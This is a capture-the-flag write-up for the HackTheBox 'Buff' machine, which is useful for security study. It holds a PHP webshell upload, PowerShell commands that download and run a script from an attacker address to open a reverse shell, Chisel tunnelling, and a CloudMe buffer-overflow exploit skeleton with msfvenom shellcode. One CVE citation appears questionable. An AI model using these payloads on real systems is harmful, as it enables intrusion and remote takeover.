# HackTheBox — Buff

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Web Exploitation / Buffer Overflow / Port Forwarding  
**Status:** Retired  

---

## Summary

Buff is a Windows machine running a vulnerable gym management web app (CVE-2019-23065 / Gym Management System 1.0 RCE). After gaining an initial foothold, privilege escalation exploits a buffer overflow in a locally-running CloudMe process (CVE-2018-6892), reachable via port forwarding.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/buff 10.10.10.198
```

```
PORT     STATE SERVICE VERSION
7680/tcp open  pando-pub?
8080/tcp open  http    Apache httpd 2.4.43
```

### Web Enumeration

Visiting `http://10.10.10.198:8080`:

- A gym website running **Gym Management System**
- Check the Contact page — reveals the software name

---

## Exploitation

### CVE-2019-23065 — Gym Management System 1.0 Unauthenticated RCE

This exploit doesn't require authentication. It abuses a file upload endpoint that allows PHP files:

```bash
# Using the public exploit
python exploit.py http://10.10.10.198:8080/
```

Manual exploit steps:

```bash
# Upload a PHP webshell to the upload endpoint (no auth required)
curl -s -F "file=@shell.php;filename=shell.php" \
  "http://10.10.10.198:8080/upload.php?id=shell"

# Trigger
curl "http://10.10.10.198:8080/upload/shell.php?cmd=whoami"
```

Shell as **shaun**.

Use the exploit to get a proper reverse shell:

```bash
# In shell.php
<?php system($_GET['cmd']); ?>

# Trigger powershell reverse shell
cmd=powershell+-c+"IEX(New-Object+Net.WebClient).downloadString('http://10.10.14.X/rev.ps1')"
```

---

## User Flag

```cmd
type C:\Users\shaun\Desktop\user.txt
```

---

## Privilege Escalation

### Discovering CloudMe

Enumerate running processes:

```cmd
tasklist
# CloudMe.exe is running
```

Check listening ports (localhost only):

```cmd
netstat -ano | findstr LISTENING
# 0.0.0.0:8888 (CloudMe listens on 8888 locally)
```

CloudMe **1.11.2** is vulnerable to a buffer overflow (CVE-2018-6892).

### Port Forwarding with Chisel

The port is only accessible locally. Forward it to our machine:

**On attacker:**
```bash
./chisel server -p 9999 --reverse
```

**On target:**
```cmd
.\chisel.exe client 10.10.14.X:9999 R:8888:127.0.0.1:8888
```

Now `localhost:8888` on our machine reaches CloudMe.

### CloudMe Buffer Overflow — CVE-2018-6892

Generate a reverse shell payload:

```bash
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.X/rev.ps1')" \
  -b '\x00\x0a\x0d' \
  -f python \
  --platform windows \
  -a x86
```

Use the public CloudMe BoF PoC and replace the shellcode with our msfvenom output:

```python
# CloudMe BoF exploit skeleton
import socket
import struct

target = '127.0.0.1'
port = 8888

# Offset: 1052 bytes before EIP
padding = b"A" * 1052
eip = struct.pack('<I', 0x1XXXXXXX)  # JMP ESP address from CloudMe.exe / DLLs
nop = b"\x90" * 16
shellcode = b"[msfvenom output here]"

payload = padding + eip + nop + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(payload)
s.close()
```

Execute the exploit — shell lands as **Administrator**.

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- **Unauthenticated file upload** = immediate RCE in poorly secured web apps
- `tasklist` and `netstat -ano` reveal locally-running services not exposed externally
- **Chisel** is the go-to tool for port forwarding when SSH tunneling isn't available
- Buffer overflows in 32-bit Windows apps follow a predictable pattern: padding → EIP → NOP sled → shellcode
- Find gadgets (`JMP ESP`) using mona.py or ropper in DLLs with no ASLR/DEP

---

## CVE References

- **CVE-2019-23065** — Gym Management System 1.0 Unauthenticated RCE
- **CVE-2018-6892** — CloudMe 1.11.2 Buffer Overflow

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| curl / Browser | Web exploitation |
| msfvenom | Shellcode generation |
| Chisel | Port forwarding |
| Python | Buffer overflow exploit |
| netcat | Reverse shell listener |
